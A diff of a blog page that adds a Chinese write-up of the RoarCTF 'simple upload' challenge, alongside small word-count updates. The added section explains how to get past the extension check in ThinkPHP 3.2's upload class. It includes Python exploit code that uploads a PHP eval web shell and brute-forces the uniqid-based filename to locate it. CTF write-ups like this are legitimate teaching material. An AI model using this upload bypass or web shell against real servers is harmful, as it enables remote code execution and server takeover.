@@ -404,14 +404,14 @@ err">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.6k
+                        3.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        12 分
+                        14 分
                     </div>
                     
                 
@@ -523,6 +523,94 @@ err">
 <p>推测下面的路径，<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
 <img src="/2019/10/20/roarctf-bu-fen-wp/19.png">
 <p>找到base64编码，解码得到flag</p>
+<h5 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple upload"></a>simple upload</h5><p>题目的源码已经给出</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+
+<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
+
+<span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 实例化上传类</span>
+        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传大小</span>
+        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传类型</span>
+        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传目录</span>
+        <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">savePath</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置附件上传子目录</span>
+        <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 上传错误提示错误信息</span>
+          <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">return</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 上传成功 获取上传文件信息</span>
+          <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token constant">__ROOT__</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">rootPath</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savepath'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'savename'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>
+          <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string">"success"</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> 
+</code></pre>
+<p>说是上传，但是找不到上传点，在链接后面随便输入index.php/ssss,发现了thInkphp报错，版本为3.24</p>
+<p>在网上找到对应版本，找到它的上传Upload.class.php</p>
+<img src="/2019/10/20/roarctf-bu-fen-wp/20.png">
+<p>可以看到这个类中定义了exts为上传的类型。那么代码中的为不会生效的</p>
+<pre><code>$upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型
+</code></pre><p>找到上传的upload方法</p>
+<img src="/2019/10/20/roarctf-bu-fen-wp/1.jpg">
+<p>可以看到，如果upload()中不带参数的话，其会对$_FILES,进行检测和上传，也就是说可以同时上传多个文件（只要表单name 不为file即可），从而绕过检测）：</p>
+<pre><code>$uploadFile = $_FILES[&#39;file&#39;] ;
+
+if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {
+    return false;
+}
+</code></pre><p>上传路径我们是知道的，但是文件名会被处理，可以看到<code>Upload.class.php</code>中定义的属性中，<code>savaName</code>为其默认的命名规则，主要利用了<code>uniqid()</code>函数：</p>
+<img src="/2019/10/20/roarctf-bu-fen-wp/21.png">
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<img src="/2019/10/20/roarctf-bu-fen-wp/23.png">
+<p>可以看到，同时上传文件时，其文件名相差很小，只有后2~3位，那么同时上传两个文件，根据第一个文件名爆破出第二个即可。exp：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token comment" spellcheck="true"># thinkphp默认路由为pathinfo路径形式 → http://网址/index.php/分组/控制器/操作方法</span>
+url<span class="token operator">=</span><span class="token string">"http://f8c2d615-93ac-4a78-9634-85dda2d38c2e.node3.buuoj.cn/index.php/home/index/upload"</span>
+files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'files'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'a.php'</span><span class="token punctuation">,</span><span class="token string">'&lt;?php @eval($_POST["cmd"]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>file<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+</code></pre>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> itertools
+<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
+
+name<span class="token operator">=</span><span class="token string">'5dbe438e0f'</span>
+
+url <span class="token operator">=</span> <span class="token string">'http://c9e017fe-a16e-446b-b9bd-c8018f548c5a.node3.buuoj.cn/Public/Uploads/2019-11-03/'</span>
+dic <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>permutations<span class="token punctuation">(</span>dic<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>
+    u <span class="token operator">=</span> url <span class="token operator">+</span> name <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.php'</span>
+    <span class="token comment" spellcheck="true">#print(u)</span>
+    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#print(s.status_code)</span>
+    <span class="token keyword">if</span> s<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>u<span class="token punctuation">,</span> s<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">break</span>
+
+</code></pre>
+<p>访问成功，得到flag</p>
 <h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="黄金六年"><a href="#黄金六年" class="headerlink" title="黄金六年"></a>黄金六年</h5><p>视频很短，播放一遍后发现存在二维码一闪而过，用暴风影音一帧一帧卡出四张二维码。</p>
 <img src="/2019/10/20/roarctf-bu-fen-wp/1.PNG">
 <img src="/2019/10/20/roarctf-bu-fen-wp/2.PNG">
@@ -1071,7 +1159,7 @@ m <span class="token operator">=</span> pow<span class="token punctuation">(</sp
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">4k</span>
+                <span class="white-color">4.5k</span>
             
 
             
